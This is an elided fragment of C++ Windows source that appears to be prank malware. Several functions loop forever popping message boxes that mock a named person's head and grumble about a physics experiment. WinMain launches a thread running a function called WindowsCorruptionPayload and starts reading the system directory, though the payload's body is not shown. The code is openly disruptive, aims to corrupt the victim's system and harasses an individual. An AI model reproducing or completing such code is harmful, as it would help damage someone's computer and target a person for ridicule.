...
void loop6() {
    for (;;) {
        MessageBox(NULL,L"大头沚淇，头太大，头太大！", L"嘿嘿",MB_ICONINFORMATION);
    }
}
void loop8() {
    for (;;) {
...
void loop7() {
    for (;;) {
        MessageBox(NULL, L"物理实验被挡住了！啊啊啊！", L"嘿嘿", MB_ICONINFORMATION);
    }
}
void loop12() {
    for (;;) {
...
int WinMain(
    ...
    CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(WindowsCorruptionPayload), NULL, 0, NULL); WCHAR SystemDirectory[MAX_PATH] = { 0 };
